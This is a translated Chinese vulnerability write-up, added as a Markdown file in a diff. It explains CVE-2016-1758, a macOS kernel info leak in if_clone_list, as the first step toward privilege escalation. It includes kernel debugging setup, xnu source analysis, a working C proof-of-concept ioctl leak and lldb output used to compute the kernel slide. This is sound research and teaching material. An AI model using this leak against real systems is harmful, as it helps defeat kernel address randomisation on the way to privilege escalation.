@@ -1,0 +1,206 @@
+# macOS内核提权：利用CVE-2016-1758获取kernel slide（Part1）
+|
+##### 译文声明
+本文是翻译文章
+译文仅供参考，具体内容表达以及含义原文为准。
+## 0x001 前言
+本文是基于CVE-2016-1758、CVE-2016-1828来讨论一下macOS下的内核提权技术。CVE-2016-1758是一个内核信息泄漏的洞，由于没有严格控制好内核栈数据copy的size，导致可以将额外8个bytes的内核地址泄漏出来，计算得到kernel_slide。CVE-2016-1828则是内核uaf的洞，存在于OSUnserializeBinary函数内，通过一个可控的虚表指针，将执行流劫持到NULL页上作ROP完成提权。
+## 0x002 调试环境
+虚拟机: OS X Yosemite 10.10.5 14F27  
+主机: macOS Mojave 10.14.2 18C54
+这里简单说一下环境搭建，在Parallel Desktop虚拟机安装`OS X 10.10.5`，主机安装`KDK 10.10.5
+14F27`，安装目录是`/Library/Developer/KDKs`，提供的内核版本、符号、内核扩展都有release、development、debug三种版本。
+启动虚拟机，看一下ip
+设置启动参数
+    sudo nvram boot-args="debug=0x141 kext-dev-mode=1 pmuflags=1 -v"
+我们这里直接调试realease版本的内核，所以不需要加`kcsuffix=development`这条参数。要是需要调试development或debug版本的内核，可以从主机安装的KDK包拷贝对应的内核到虚拟机的`/System/Library/Kernels`目录，再设置kcsuffix参数。
+令内核缓存无效，重启
+    sudo kextcache -invalidate /
+    sudo reboot
+主机打开lldb，引入调试符号
+    target create /Library/Developer/KDKs/KDK_10.10.5_14F27.kdk/System/Library/Kernels/kernel
+虚拟机启动起来卡在开机，并等待调试器接入
+kdp-remote连上去
+## 0x003 内核源码分析
+获取xnu内核代码
+[xnu-2782.40.9
+](https://opensource.apple.com/tarballs/xnu/xnu-2782.40.9.tar.gz)
+找到`/bsd/net/if.c`里的`if_clone_list`方法
+    /*
+     * Provide list of interface cloners to userspace.
+     */
+    static int
+    if_clone_list(int count, int *ret_total, user_addr_t dst)
+    {
+      char outbuf[IFNAMSIZ];
+      struct if_clone *ifc;
+      int error = 0;
+      *ret_total = if_cloners_count;
+      if (dst == USER_ADDR_NULL) {
+        /* Just asking how many there are. */
+        return (0);
+      }
+      if (count ifc_name, IFNAMSIZ);
+        error = copyout(outbuf, dst, IFNAMSIZ);
+        if (error)
+          break;
+      }
+      return (error);
+    }
+`IFNAMSIZ`长度为16，由于ifc是定义在内核栈上的局部数据，当`ifc_name`小于`outbuf`的长度，所以会将未初始化的内核地址拷贝到用户空间，计算得到kernel
+slide。
+`ifc_name`存放着6个bytes的数据`bridge`，剩余9个bytes为初始化的数据存在`outbuf`上。
+下面是`if_clone_list`方法的调用链
+    soo_ioctl -> soioctl -> ifioctllocked -> ifioctl -> ifioctl_ifclone -> if_clone_list
+soo_ioctl方法在socketops结构体中被引用
+    const struct fileops socketops = {
+      DTYPE_SOCKET,
+      soo_read,
+      soo_write,
+      soo_ioctl,
+      soo_select,
+      soo_close,
+      soo_kqfilter,
+      soo_drain
+    };
+要使得`ifioctl`调用`ifioctl_ifclone`，要传进cmd参数`SIOCIFGCLONERS`，类似这样`ioctl(sockfd,SIOCIFGCLONERS,&ifcr)`
+    int
+    ifioctl(struct socket *so, u_long cmd, caddr_t data, struct proc *p)
+    {
+      char ifname[IFNAMSIZ + 1];
+      struct ifnet *ifp = NULL;
+      struct ifstat *ifs = NULL;
+      int error = 0;
+      bzero(ifname, sizeof (ifname));
+      /*
+       * ioctls which don't require ifp, or ifreq ioctls
+       */
+      switch (cmd) {
+      case OSIOCGIFCONF32:      /* struct ifconf32 */
+      case SIOCGIFCONF32:     /* struct ifconf32 */
+      case SIOCGIFCONF64:     /* struct ifconf64 */
+      case OSIOCGIFCONF64:      /* struct ifconf64 */
+        error = ifioctl_ifconf(cmd, data);
+        goto done;
+      case SIOCIFGCLONERS32:      /* struct if_clonereq32 */
+      case SIOCIFGCLONERS64:      /* struct if_clonereq64 */
+        error = ifioctl_ifclone(cmd, data);
+        goto done;
+      case SIOCGIFAGENTDATA32:    /* struct netagent_req32 */
+      case SIOCGIFAGENTDATA64:    /* struct netagent_req64 */
+        error = netagent_ioctl(cmd, data);
+        goto done;
+查看`ifioctl_ifclone`方法，要使用`if_clonereq`结构作为`if_clone_list`的调用参数
+    static __attribute__((noinline)) int
+    ifioctl_ifclone(u_long cmd, caddr_t data)
+    {
+      int error = 0;
+      switch (cmd) {
+      case SIOCIFGCLONERS32: {    /* struct if_clonereq32 */
+        struct if_clonereq32 ifcr;
+        bcopy(data, &ifcr, sizeof (ifcr));
+        error = if_clone_list(ifcr.ifcr_count, &ifcr.ifcr_total,
+            CAST_USER_ADDR_T(ifcr.ifcru_buffer));
+        bcopy(&ifcr, data, sizeof (ifcr));
+        break;
+      }
+      case SIOCIFGCLONERS64: {    /* struct if_clonereq64 */
+        struct if_clonereq64 ifcr;
+        bcopy(data, &ifcr, sizeof (ifcr));
+        error = if_clone_list(ifcr.ifcr_count, &ifcr.ifcr_total,
+            ifcr.ifcru_buffer);
+        bcopy(&ifcr, data, sizeof (ifcr));
+        break;
+      }
+      default:
+        VERIFY(0);
+        /* NOTREACHED */
+      }
+      return (error);
+    }
+最后，我们分析得到这样一段泄漏代码
+    // CVE-2016-1758 kernel info leak
+    #include 
+    #include 
+    #include 
+    #include 
+    char buffer[IFNAMSIZ];
+    struct if_clonereq ifcr = {
+        .ifcr_count = 1,
+        .ifcr_buffer = buffer,
+    };
+    int main(){
+        int sockfd = socket(AF_INET,SOCK_STREAM,0);
+        int err = ioctl(sockfd,SIOCIFGCLONERS,&ifcr);
+        printf("%sn",buffer);
+        printf("0x%016llxn",*(uint64_t *)buffer);
+        printf("0x%016llxn",*(uint64_t *)(buffer+8));
+    }
+## 0x004 Info leak: CVE-2016-1758
+回到调试器，在`if_clone_list`方法下断点
+    kernel was compiled with optimization - stepping may behave oddly; variables may not be available.                  │R15 FFFFFF7F981F5310 | .S...... | => 0xF>
+    Process 1 stopped                                                                                                   │CS  0000  DS  0000
+    * thread #2, name = '0xffffff801e134e28', queue = '0x0', stop reason = signal SIGSTOP                               │ES  n/a   FS  0000
+        frame #0: 0xffffff801790b868 kernel`kdp_register_send_receive(send=, receive=) at kdp_│GS  0000  SS  n/a
+    udp.c:463 [opt]                                                                                                     │
+    Target 0: (kernel) stopped.                                                                                         │
+    (lldb) break set -name if_clone_list                                                                                │
+    Breakpoint 1: 2 locations.                                                                                          │
+    (lldb) c
+在虚拟机内安装`xcode-command-tools`
+    xcode-select --install
+编译泄漏代码后直接运行，调试器断在`ifioctl_ifclone`方法
+    Loading 1 kext modules warning: Can't find binary/dSYM for com.apple.filesystems.smbfs (CD5CEA75-1160-31C9-BAAA-B1373623BAE3)
+    . done.
+    Process 1 stopped
+    * thread #23, name = '0xffffff801ea56c50', queue = '0x0', stop reason = breakpoint 1.1
+        frame #0: 0xffffff8017b9ac6d kernel`ifioctl_ifclone [inlined] if_clone_list(count=1, ret_total=0x0000000100000000, dst=4465025088) at if.c:672 [opt]
+    Target 0: (kernel) stopped.
+    (lldb) b
+查看栈回溯，调用过程大体上与我们分析的一致
+    (lldb) bt                                                                                                           │RDX 0000000000000010 | ........ |
+    * thread #23, name = '0xffffff801ea56c50', queue = '0x0', stop reason = breakpoint 1.1                              │RCX 0000000000000000 | ........ |
+      * frame #0: 0xffffff8017b9ac6d kernel`ifioctl_ifclone [inlined] if_clone_list(count=1, ret_total=0x000000010000000│R8  FFFFFF80221D89D8 | ...".... |
+    0, dst=4465025088) at if.c:672 [opt]                                                                                │R9  0000000000000000 | ........ |
+        frame #1: 0xffffff8017b9ac6d kernel`ifioctl_ifclone(cmd=, data="") at if.c:1482 [opt]              │R10 0000000000000000 | ........ |
+        frame #2: 0xffffff8017b9958f kernel`ifioctl(so=, cmd=3222301057, data="", p=0xffffff8020e331a0) at │R11 0000000000000206 | ........ |
+    if.c:1732 [opt]                                                                                                     │R12 00000000C0106981 | .i...... |
+        frame #3: 0xffffff8017b99cbf kernel`ifioctllocked(so=0xffffff8026c69680, cmd=, data=, │R13 0000000000000001 | ........ |
+    p=) at if.c:2515 [opt]                                                                                 │R14 FFFFFF8018112F48 | H/...... | => `__>
+        frame #4: 0xffffff8017df1f0a kernel`soioctl(so=0xffffff8026c69680, cmd=, data="", p=0xffffff8020e33│R15 000000010A22E040 | @."..... |
+    1a0) at sys_socket.c:279 [opt]                                                                                      │CS  0000  DS  0000
+        frame #5: 0xffffff8017dadddb kernel`fo_ioctl(fp=0xffffff80221d89d8, com=3222301057, data="", ctx=0xffffff8077453│ES  n/a   FS  FFFF0000
+    e88) at kern_descrip.c:5687 [opt]                                                                                   │GS  77450000  SS  n/a
+        frame #6: 0xffffff8017decd64 kernel`ioctl(p=0xffffff8020e331a0, uap=0xffffff801e3477a0, retval=) at│
+     sys_generic.c:911 [opt]                                                                                            │
+        frame #7: 0xffffff8017e4b376 kernel`unix_syscall64(state=0
+查看源码，我们选择断在`if.c:1484`这行，这里刚好是调用完`if_clone_list`的返回
+    (lldb) b if.c:1484
+继续跑起来，现在断在`bcopy(&ifcr, data, sizeof (ifcr));`这行以前，`ifcr`包含着未初始化的内核栈数据
+        0xffffff8017b9ae84 : jmp    0xffffff8017b9aea5        ;  at if.c:1484
+        0xffffff8017b9ae86 : xorl   %ebx, %ebx
+        0xffffff8017b9ae88 : leaq   -0x60(%rbp), %rdi
+        0xffffff8017b9ae8c : movl   $0x10, %edx
+    ->  0xffffff8017b9ae91 : int3
+        0xffffff8017b9ae92 : movl   -0x68(%rbp), %esi
+        0xffffff8017b9ae95 : callq  0xffffff801770e080        ; bcopy
+        0xffffff8017b9ae9a : leaq   0x5780a7(%rip), %r14      ; __stack_chk_guard
+        0xffffff8017b9aea1 : jmp    0xffffff8017b9aeb7        ;  at if.c:1475
+rdi指向`ifcr`，可以看到`0xffffff801793487f`便是我们可以泄漏出来的内核地址，而该地址的前方便是`bridge`字符串
+查看该地址的汇编代码
+    (lldb) x/10i 0xffffff801793487f                                                                                     │R12 FFFFFF8077483C80 | . "br>
+        0xffffff801793487f: 44 89 f0     movl   %r14d, %eax                                                             │R13 0000000000000000 | ........ |
+        0xffffff8017934882: 48 83 c4 08  addq   $0x8, %rsp                                                              │R14 FFFFFF8018064208 | .B...... | => 0xF>
+        0xffffff8017934886: 5b           popq   %rbx                                                                    │R15 000000010C0AB050 | P....... |
+        0xffffff8017934887: 41 5e        popq   %r14                                                                    │CS  0000  DS  0000
+        0xffffff8017934889: 41 5f        popq   %r15                                                                    │ES  n/a   FS  FFFF0000
+        0xffffff801793488b: 5d           popq   %rbp                                                                    │GS  77480000  SS  n/a
+        0xffffff801793488c: c3           retq                                                                           │
+        0xffffff801793488d: 0f 1f 00     nopl   (%rax)                                                                  │
+        0xffffff8017934890: 55           pushq  %rbp                                                                    │
+        0xffffff8017934891: 48 89 e5     movq   %rsp, %rbp
+内核继续跑起来，再次确认我们找的地址没问题
+利用`librop`的代码(已经上传到个人github上)找到对应内核文件的地址`0xFFFFFF800033487F`，用泄漏地址减去该地址便是kernel_slide。
+[[传送门]](https://github.com/wooy0ung/macos-exploits)
+每次重启后kernel_slide都会变，需要重新计算得到，本次`kernel_slide = 0x17600000`。
+由于篇幅问题，关于`CVE-2016-1828`的分析以及做ROP提权的技术会放到下一篇文章中讲解。
